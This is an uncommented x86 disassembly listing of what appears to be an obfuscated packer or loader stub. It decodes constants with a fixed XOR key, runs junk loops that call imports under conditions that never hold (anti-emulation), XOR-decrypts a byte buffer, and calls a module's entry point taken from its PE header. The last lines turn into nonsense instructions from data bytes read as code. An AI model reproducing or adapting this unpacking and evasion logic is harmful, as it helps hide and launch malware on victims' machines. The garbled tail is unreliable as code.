  41082c:	cmp    DWORD PTR ds:0x427014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42501c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x428010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x428010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x428010,edi
  410859:	cmp    DWORD PTR ds:0x428010,0xd
  410860:	jne    0x410874
  410866:	push   0x41ffb1
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x421008
  410874:	cmp    DWORD PTR ds:0x428010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x428010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x428010,edi
  41088e:	cmp    DWORD PTR ds:0x428010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41d3dc
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x425028
  4108bf:	add    DWORD PTR ds:0x427018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x42601c,0x425018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x425000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x429010,ebx
  4108e8:	mov    eax,ds:0x41d5d8
  4108ed:	mov    DWORD PTR ds:0x427008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x427000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x427000
  410914:	inc    eax
  410915:	mov    ds:0x427000,eax
  41091a:	cmp    DWORD PTR ds:0x427000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x421048
  410930:	cmp    DWORD PTR ds:0x427000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41d3dc
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41d5d8,eax
  41095e:	mov    eax,ds:0x41d3dc
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41d3dc
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41d260,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41d4b4,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41d260
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41d3dc
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41d4b4
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41d260
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41d3dc
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41d460,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41d458,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41d3dc
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x42601c
  410baa:	or     DWORD PTR ds:0x425008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x42800c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x42800c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x42800c,ecx
  410be0:	cmp    DWORD PTR ds:0x42800c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x42800c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x41ff8d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42104c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41d25c
  410c2b:	sbb    DWORD PTR ds:0x42801c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x426004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x426004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x426004,ecx
  410c4d:	cmp    DWORD PTR ds:0x426004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x421014
  410c65:	cmp    DWORD PTR ds:0x426004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x425024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x425024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x425024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x421018
  410ca1:	cmp    DWORD PTR ds:0x425024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x425024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x425024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x425024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x425024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41d464
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x42601c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x42900c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x42900c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x42900c,ecx
  410d03:	cmp    DWORD PTR ds:0x42900c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42101c
  410d24:	cmp    DWORD PTR ds:0x42900c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x42900c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x42900c,ecx
  410d40:	cmp    DWORD PTR ds:0x42900c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x429010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41d3dc
  410d65:	sbb    DWORD PTR ds:0x428018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42501c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x428018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x428018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x428018,ecx
  410da6:	cmp    DWORD PTR ds:0x428018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x428018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x41ffef
  410dc5:	push   0x41ffd1
  410dca:	call   DWORD PTR ds:0x421050
  410dd0:	cmp    DWORD PTR ds:0x428018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x428018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x428018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x426000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x427000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x429010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x425020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x429010,0x17
  410e47:	cmp    DWORD PTR ds:0x429010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x429010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x421054
  410e6f:	cmp    DWORD PTR ds:0x429010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x429010
  410e81:	dec    eax
  410e82:	mov    ds:0x429010,eax
  410e87:	mov    eax,ds:0x429010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x429010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x429004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x429004
  410eab:	inc    eax
  410eac:	mov    ds:0x429004,eax
  410eb1:	cmp    DWORD PTR ds:0x429004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x429004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x42801c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x421058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x429014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x425000,0x42600c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x42900c,0x426014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x426008,0x425014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x427018,0x426018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x426004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x429010,0x42501c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x425020,0x427018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42501c,0x425000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x429010,0x1047
  410f77:	mov    eax,ds:0x41d3fc
  410f7c:	and    DWORD PTR ds:0x425018,0x428010
  410f86:	push   0x41d352
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x427000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x425008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x429010,0x42900c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x425010,0x425014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x428018,0x42900c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x427000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x426008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x426008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x426008,ebx
  410ff5:	cmp    DWORD PTR ds:0x426008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x42900c
  411007:	push   0x429010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42105c
  411017:	cmp    DWORD PTR ds:0x426008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x426004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x426004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x426004,ebx
  41103d:	cmp    DWORD PTR ds:0x426004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x421020
  41105d:	cmp    DWORD PTR ds:0x426004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x427018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x428018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41d1f8
  411086:	mov    ebx,DWORD PTR ds:0x41d1fc
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x426018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x426018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x426018,ebx
  4110b0:	cmp    DWORD PTR ds:0x426018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x426018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x421028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x429004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x427004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x427004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x427004,ebx
  411104:	cmp    DWORD PTR ds:0x427004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x41ff2e
  411116:	call   DWORD PTR ds:0x42102c
  41111c:	cmp    DWORD PTR ds:0x427004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x427004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x427004,ebx
  411136:	cmp    DWORD PTR ds:0x427004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x428014
  41114a:	sbb    DWORD PTR ds:0x425000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0xbde4d2d3
  411322:	aas    
  411323:	push   edi
  411324:	mov    fs,WORD PTR [edx+0x62]
  411327:	int    0x5f
  411329:	bound  esp,QWORD PTR [edx+0x71]
  41132c:	hlt    
  41132d:	pusha  
  41132e:	in     eax,dx
  41132f:	out    0xf4,al
  411331:	pushf  
  411332:	push   0xffffff93
  411334:	pop    ds
  411335:	push   esi
  411336:	mov    ds:0xa5b75a93,eax
  41133b:	bound  ebx,QWORD PTR [edx]
